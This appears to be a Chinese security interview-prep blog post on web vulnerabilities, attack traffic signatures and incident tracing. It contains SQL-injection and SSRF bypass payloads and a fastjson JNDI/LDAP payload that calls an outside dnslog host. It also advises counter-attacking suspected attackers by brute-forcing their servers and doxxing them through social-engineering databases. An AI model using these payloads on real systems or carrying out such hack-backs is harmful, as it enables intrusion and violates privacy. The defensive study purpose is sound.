<p>Mssql：1433    &#x2F;&#x2F;全称：Microsoft SQL Server</p>
<p>PostgreSQL：5432</p>
<p><strong>但在实际使用中可能会根据需要进行修改</strong></p>
<h2 id="SQL注入的流量分析"><a href="#SQL注入的流量分析" class="headerlink" title="SQL注入的流量分析"></a>SQL注入的流量分析</h2><p>通过日志查看攻击者输入的字段。一般在用户密码登录时攻击者会注入恶意SQL语句，如果网站不对用户输入的内容 进行限制，极易出现对网站的破坏。</p>
<p>union ,select ，sleep 等敏感字符。</p>
<h2 id="常见SQL注入绕过"><a href="#常见SQL注入绕过" class="headerlink" title="常见SQL注入绕过"></a>常见SQL注入绕过</h2><p><strong>SQL注入大小写绕过：</strong></p>
<p>通过将语句大小写更改，进行绕过。（这种情况通常出现在WAF对打小写没有过滤的情况下）</p>
<pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入注释符绕过:</strong></p>
<p>通过添加注释符对语句内容进行绕</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;*绕过的内容*&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入空格绕过</strong></p>
<p>通过添加空格的URL编码进入绕过</p>
<pre class="line-numbers language-none"><code class="language-none">空格的URL编码%20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入引号绕过</strong></p>
<p>使用到引号的地方一般在语句中，像where语句，这条语句意识就是用来查得到users表中所有字段</p>
<pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入十六进制绕过</strong></p>
<p>当引号绕过方法被过滤的情况下，还可以利用进制进行绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入from for语句绕过</strong></p>
<p>当进行SQL盲注会用到，<code>substr()</code> ,<code>mid()</code> ,<code>limit</code>。这些句子方法都需要用到逗号。对于<code>substr()</code> ,<code>mid()</code> 句子可以直接利用from for句子进行绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">单引号绕过，与from for绕过 select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入比较符绕过&lt;&gt;</strong></p>
<p>sql盲注,使用二分查找时需要使用到比较符来进行。</p>
<pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>SQL注入greatest绕过</strong></p>
<p>当比较符被系统过滤了，比较符盲注语句无法使用时，可以使用greatest来代替比较操作符。<code>greatest(n1,n2,n3,n4等)</code>函数返回输入参数<code>(n1,n2,n3,n4等)</code>的最大值。</p>
<p>sql语句可以使用greatest变为ascii码值进行大小爆破</p>
<pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入编码绕过</strong></p>
<p>URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<pre class="line-numbers language-none"><code class="language-none">ASCII码绕过Test 等价于CHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对关键字进行URL编码绕过</p>
<pre class="line-numbers language-none"><code class="language-none">URL编码转换绕过1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>16进制编码转换绕过</p>
<pre class="line-numbers language-none"><code class="language-none">将users转换为十六进制进行绕过select column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL注入内联注释绕过</strong></p>
<pre class="line-numbers language-none"><code class="language-none">内联注释就是把一些特有的仅在MYSQL上的语句放在 &#x2F;!..&#x2F; 中，这些语句如果在其它数据库中是不会被执行而在SQL数据库中可被执行 select * from cms_users where userid&#x3D;1 union &#x2F;*!select*&#x2F; 1,2,3;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="sql注入过滤"><a href="#sql注入过滤" class="headerlink" title="sql注入过滤"></a>sql注入过滤</h2><ol>
<li><strong>使用参数化查询</strong>：参数化查询可以将用户输入和SQL代码分开，从而避免SQL注入攻击。通过使用预编译语句和参数化查询语句，应用程序可以把用户输入转化为参数，而不是直接拼接到SQL语句中。</li>
<li><strong>对输入进行过滤和验证</strong>：在应用程序中对输入数据进行过滤和验证，可以有效地减少SQL注入攻击的风险。可以使用白名单或黑名单机制，过滤掉非法字符或语句，或者对输入数据进行格式验证和长度限制。</li>
<li><strong>使用ORM框架</strong>：使用ORM框架可以避免手动拼接SQL语句，从而减少SQL注入攻击的风险。ORM框架可以自动将数据转换为参数，从而防止恶意SQL注入攻击。</li>
<li><strong>使用防火墙</strong>：使用Web应用程序防火墙可以监测和防止SQL注入攻击。防火墙可以对输入数据进行检查，过滤掉恶意SQL语句，从而保护应用程序不受攻击。</li>
</ol>
<h2 id="Sql注入分类"><a href="#Sql注入分类" class="headerlink" title="Sql注入分类"></a>Sql注入分类</h2><p>报错注入、盲注、时间盲注、二次注入，宽字节,堆叠注入，http header的注入，xff，cookie注入</p>
<h3 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h3><p>1.数据库为GBK编码<br> 2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符  \  进行转义</p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root %df' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
<span class="token comment"># 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h2><p>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<h2 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h2><p>函数：</p>
<p>floor()函数，</p>
<p>exp()函数，</p>
<p>convert()函数，</p>
<p>updataxml()函数，返回数据长度&lt;32位</p>
<p>name_const()函数，</p>
<p>extractvalue()函数：返回数据长度&lt;32位</p>
<h2 id="XXE漏洞（即XMl外部实体注入漏洞）"><a href="#XXE漏洞（即XMl外部实体注入漏洞）" class="headerlink" title="XXE漏洞（即XMl外部实体注入漏洞）"></a>XXE漏洞（即XMl外部实体注入漏洞）</h2><p><strong>XXE</strong>漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害</p>
<h2 id="怎么判断网站是否存在XXE漏洞"><a href="#怎么判断网站是否存在XXE漏洞" class="headerlink" title="怎么判断网站是否存在XXE漏洞"></a>怎么判断网站是否存在XXE漏洞</h2><p>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p>
<h2 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p>
<ol>
<li>用户输入账号信息请求登录A网站。</li>
<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！</li>
</ol>
<p>两个条件：a 用户访问站点A并产生了cookie</p>
<p>b 用户没有退出A同时访问了B</p>
<h2 id="SSRF漏洞（服务器端请求伪造）"><a href="#SSRF漏洞（服务器端请求伪造）" class="headerlink" title="SSRF漏洞（服务器端请求伪造）"></a>SSRF漏洞（服务器端请求伪造）</h2><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<p>从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>利用的是服务端的请求伪造。</p>
<p>SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3><p><strong>1.@符号绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;
1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据</p>
<p><strong>2.IP地址转换：</strong></p>
<p>对内网请求的IP地址进行各进制的编码</p>
<p><strong>3.转换短网址：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;
例：http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>4.特殊符号替换绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">例：
http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;www。kxsy。work&#x2F;
localhost或者0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>5.302跳转绕过：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
$schema &#x3D; $_GET[&#39;s&#39;];
$ip     &#x3D; $_GET[&#39;i&#39;];
$port   &#x3D; $_GET[&#39;p&#39;];
$query  &#x3D; $_GET[&#39;q&#39;];
if(empty($port))&#123;  
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); 
&#125; else &#123;
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>6.xip.io绕过：会将解析到子域</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1
www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>8.其他协议绕过 ：</strong></p>
<p>配合File、 GOPHER等协议的对目标进行信息探测</p>
<h2 id="XSS（跨站点脚本攻击）"><a href="#XSS（跨站点脚本攻击）" class="headerlink" title="XSS（跨站点脚本攻击）"></a>XSS（跨站点脚本攻击）</h2><p>服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现<strong>对客户端的攻击</strong>目的。</p>
<p>反射型XSS</p>
<p>存储型XSS</p>
<p>DOM型XSS：DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
<h2 id="xss与csrf的区别"><a href="#xss与csrf的区别" class="headerlink" title="xss与csrf的区别"></a>xss与csrf的区别</h2><p>**xss：跨站脚本攻击、诱骗用户点击恶意链接盗取用户cookie进行攻击、不需要用户进行登录、xss除了利用cookie还可以篡改网页等. **</p>
<p><strong>csrf：跨站请求伪造、无法获取用户的cookie而是直接冒充用户、需要用户登录后进行操作</strong></p>
<h2 id="哪里使用到了dnslog外带"><a href="#哪里使用到了dnslog外带" class="headerlink" title="哪里使用到了dnslog外带"></a>哪里使用到了dnslog外带</h2><h3 id="DNSlog外带原理："><a href="#DNSlog外带原理：" class="headerlink" title="DNSlog外带原理："></a>DNSlog外带原理：</h3><p>DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。</p>
<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>盲注需要频繁请求才能获取数据库中的值，在有waf的情况下很容易被ban ip。这种情况下可以结合DNSLog将数据取出。<strong>如果遇到MySQL的盲注，可以利用内置函数load_file()来完成DNSLog。load_file()不仅能够加载本地文件，同时也能对诸如<code>www.baidu.com</code>这样的url发起请求</strong></p>
<h3 id="无回显的SSRF"><a href="#无回显的SSRF" class="headerlink" title="无回显的SSRF"></a>无回显的SSRF</h3><p>将url换成我们的DNS服务器，通过查看DNSLog平台日志查看是否有服务器ip判断是否有ssrf漏洞</p>
<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>xss盲打是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入的带有真实攻击行为的xss代码数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的真实攻击功能。</p>
<h3 id="log4j漏洞"><a href="#log4j漏洞" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><p>构造以下payload（content-type字段为application&#x2F;json），利用dnslog平台接收：{“zeo”:{“@type”:”java.net.Inet4Address”,”val”:”ntel8h.dnslog.cn”}}（不同版本，payload不同。推荐这种方式）</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;b&quot;:&#123;
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,
        &quot;autoCommit&quot;:true
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLog的综合利用 (qq.com)</a></p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a>weblogic漏洞</h3><p>在weblogic里面其实反序列化漏洞利用中大致分为两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞。</p>
<p>1.直接通过<strong>T3协议</strong>发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)<br>2.利用<strong>T3协议</strong>配合<strong>RMP</strong>或<strong>ND接口</strong>反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用<strong>IIOP协议</strong>的CVE-2020-2551<br>3.通过 javabean <strong>XML</strong>方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p>
<p><strong>xml：</strong>是因为<strong>xmldecode</strong>解析导致的反序列化，他的包就是一个很大的xml格式内容</p>
<h3 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3><p>请求包里发送恶意js格式的payload，在处理json对象的时候没有过滤@type字段，从而使fastjson通过字段传入一个类，在执行时进而实行构造恶意函数。</p>
<h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><strong>shiro550：</strong></p>
<p><strong>关键词：RememberMe</strong></p>
<p>存在一个忘记密码功能，用户信息会进行加密，而这一个过程中密钥出现了问题，使用密钥进行碰撞并且不需要cookie，从而构造反序列化rce，进而攻击。</p>
<p><strong>shiro721:</strong></p>
<p>shiro721利用的前提就是存在cookie，构造cookie值进行rce。</p>
<h3 id="log4j漏洞-1"><a href="#log4j漏洞-1" class="headerlink" title="log4j漏洞"></a>log4j漏洞</h3><p>Log4j2 组件在处理程序日志记录时存在JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2 组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<p><strong>特征：</strong>${xxxxxx}</p>
<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h3 id="cs流量特征："><a href="#cs流量特征：" class="headerlink" title="cs流量特征："></a><strong>cs流量特征：</strong></h3><p>对比正常的http流量，CS的http通信流量具有以下几个特征： </p>
<p>A. <strong>心跳包特征</strong> </p>
<p>a) 间隔一定时间，均有通信，且流级上的上下行数据长度固定； </p>
<p>B. <strong>域名&#x2F;IP特征</strong> </p>
<p>a) 未走CDN、域前置的，域名及IP暴露</p>
<p>b) 走CDN、域前置的，真实IP会被隐藏； </p>
<p>C. <strong>指令特征</strong> </p>
<p>a) 下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。 </p>
<p>b) 指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。 </p>
<p>c) 不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。 </p>
<p>D. <strong>数据特征</strong> </p>
<p>a) 在请求的返回包中，通信数据均隐藏在jqeury*.js中。</p>
<h3 id="MSF流量特征："><a href="#MSF流量特征：" class="headerlink" title="MSF流量特征："></a><strong>MSF流量特征：</strong></h3><p>1，端口号：msf默认使用4444端口作为反向连接端口</p>
<p>2，数据内容：msf数据包通常包含特定字符串:(“meterpreter”、”revshell”等)</p>
<h3 id="冰蝎流量特征"><a href="#冰蝎流量特征" class="headerlink" title="冰蝎流量特征:"></a><strong>冰蝎流量特征:</strong></h3><p><strong>冰蝎2.0和3.0区别：</strong></p>
<p><strong>1，加密方式不同，一个是RC4加密，一个AES加密。</strong></p>
<p><strong>2，编写语言不同，2.0采用的是c++，3.0采用的是java。</strong></p>
<p><strong>3，冰蝎流量检测，无论是get请求还是post请求，</strong>content-type都为<strong>application&#x2F;octet-stream</strong>。</p>
<p>冰蝎4.0流量分析：1，十种ua头，可关键字拦截ua头进行匹配拦截。</p>
<p>2，流量特征，Content-type: Application&#x2F;x-www-form-urlencoded。</p>
<p>3，accept字段：Accept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>
<p>（4.0我也不太明白，自己网上多查查资料吧）</p>
<h3 id="哥斯拉流量特征"><a href="#哥斯拉流量特征" class="headerlink" title="哥斯拉流量特征:"></a><strong>哥斯拉流量特征:</strong></h3><p>1，强特征：cookie字段，最后一个Cookie的值出现  “**;**”（尾值出现分号）</p>
<p>2，paylod特征：jsp会出现xc,pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马。</p>
<h3 id="菜刀流量特征："><a href="#菜刀流量特征：" class="headerlink" title="菜刀流量特征："></a><strong>菜刀流量特征：</strong></h3><p>1，请求包中：ua头为百度，火狐</p>
<p>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的数值</p>
<p>4.伪造X-Forwarded-For头</p>
<h3 id="蚁剑流量分析："><a href="#蚁剑流量分析：" class="headerlink" title="蚁剑流量分析："></a><strong>蚁剑流量分析：</strong></h3><p>1，payload特征：Php中使用assert，eval执行；asp 使用eval；在jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征。</p>
<p>2，流量特征：每个请求体都在：@ini_set(“diplay_erors”,“0”);@set_time_limit(0)开头。并且后面存在base64等字符</p>
<h2 id="常见的中间件漏洞"><a href="#常见的中间件漏洞" class="headerlink" title="常见的中间件漏洞"></a>常见的中间件漏洞</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">PUT</span>漏洞、短文件名猜解、远程代码执行、解析漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">解析漏洞、目录遍历<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">文件解析、目录遍历、<span class="token constant">CRLF</span>注入、目录穿越<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">远程代码执行、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">反序列化漏洞、war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><pre class="line-numbers language-none"><code class="language-none">反序列化漏洞
SSRF任意文件上传
war后门文件部署<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h2 id="内存马查找"><a href="#内存马查找" class="headerlink" title="内存马查找"></a>内存马查找</h2><p><strong>windows：</strong>看看dll文件，注册表，查看外联可以的vps的地址。</p>
<p>**linux:**使用命令进行遍历。</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h3><p>在拿到一个url时，先确定自己的渗透目标，是要测试整个网站还是某个模块。自己要干什么首先要想清楚。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>此阶段是渗透测试中最基础也是最关键的一步，信息收集的多少一定程度上决定是否能够渗透成功。信息收集过程中可以借助<strong>搜索引擎</strong>（fofa，钟馗之眼）获得一些重要信息。比如后台，敏感的url等。</p>
<p>通过域名找到IP，子域名，旁站，是否存在CDN。<strong>（站长工具）</strong></p>
<p>探测网站相关版本信息，如果网站用了cms，那就查找cms指纹，查找该cms是否存在漏洞。</p>
<p><strong>旁站</strong>：与本网站公用一个服务器。</p>
<p><strong>C段（护网中较有意义）</strong>：C段指的是同一内网段内的其他服务器。</p>
<p>等等。</p>
<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>对网站进行漏洞探测，可以使用相关工具（不问不说：AWVS,Appscan,Nessuss）。扫描到漏洞的话进行漏洞验证利用。</p>
<p>顺利的话最终拿到webshell。</p>
<p>测试结束后总结整个流程，给相关机构提出修复建议。</p>
<h3 id="拿到网站登录框该怎么下手"><a href="#拿到网站登录框该怎么下手" class="headerlink" title="拿到网站登录框该怎么下手"></a>拿到网站登录框该怎么下手</h3><p>首先分析登录框的参数。</p>
<p>尝试弱口令登录，能够进行爆破的话进行爆破。</p>
<p>SQL注入在登陆框也容易出现，如果存在sql注入漏洞的话那就进行攻击。</p>
<h2 id="溯源的思路"><a href="#溯源的思路" class="headerlink" title="溯源的思路"></a>溯源的思路</h2><p>1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，<br>因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。<br>1.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
<p>4.已经被上传webshell应急<br>2.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.<br>(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析.<br>(windows)的话就看启动项和进程.<br>如果是web入侵,看日志web服务是不是安全?还原攻击的流程.<br>5.流量溯源<br>1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门改补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</p>
<h2 id="溯源反制的思路？"><a href="#溯源反制的思路？" class="headerlink" title="溯源反制的思路？"></a><strong>溯源反制的思路？</strong></h2><p>1.攻击源捕获</p>
<ul>
<li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li>
<li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li>
<li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li>
<li>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</li>
<li>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</li>
</ul>
<p> 2.溯源反制</p>
<ul>
<li>IP 定位技术<br>根据IP定位物理地址–代理   IP<br>溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</li>
<li>ID 追踪术<br>ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配<br>溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</li>
<li>网站 url<br>域名 Whois 查询–注册人姓名、地址、电话和邮箱   –域名隐私保护<br>溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</li>
<li>恶意样本分析<br>提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析<br>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</li>
<li>社交账号<br>基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等<br>利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</li>
</ul>
<p> 3.攻击者画像</p>
<ul>
<li>攻击路径</li>
</ul>
<p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等<br>网络代理：代理 IP、跳板机、C2 服务器等<br>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p>
<ul>
<li>攻击者身份画像</li>
</ul>
<p>虚拟身份：ID、昵称、网名<br>真实身份：姓名、物理位置<br>联系方式：手机号、qq&#x2F;微信、邮箱<br>组织情况：单位名称、职位信息</p>
<h2 id="研判的思路？"><a href="#研判的思路？" class="headerlink" title="研判的思路？"></a><strong>研判的思路？</strong></h2><p>1.首先对<strong>攻击的来源</strong>进行判断，是内对内，外对内还是内对外的情况。</p>
<p>2.依据设备的告警信息结合具体情况来分析<strong>攻击行为的类型</strong>，比如说告警SQL注入攻击，那我们就去查看一下请求数据包里面是否有单引号，SELECT等敏感字符，返回数据包里面是否有SQL语法报错等信息，有的话就可以初步判断该攻击行为是SQL注入攻击。</p>
<p>3.然后就是<strong>根据攻击特征来分析</strong>攻击行为使用了什么技术或者说工具，比如说攻击的频率，数据包的信息等等。比如说在使用AWVS或者APPSCAN等工具在扫描的时候，很有可能在请求数据包的user-agent里面就有相关的信息。同样结合告警信息和具体情况来判断攻击行为的危害程度，比如说检测到多条攻击成功告警和内对内及内对外攻击告警，这个时候就需要尽快的交给应急组了。</p>
<p>4.结合设备告警信息及具体情况<strong>分析攻击意图</strong>，比如说攻击者的目标是主站还是旁站，是主机还是域控，不同的攻击意图对于后续的处理也不同。</p>
<p>5.最后根据我们掌握的信息采<strong>取相应的处置</strong>方式，比如说告警信息是误报，说明设备需要策略优化，不需要处置。告警信息是尝试攻击，暂时对资产没有影响，就需要后续持续关注，攻击成功时能够做到及时上报。如果告警确认不是误报，并且攻击成功时，我们就需要迅速上报及时采取应急响应。</p>
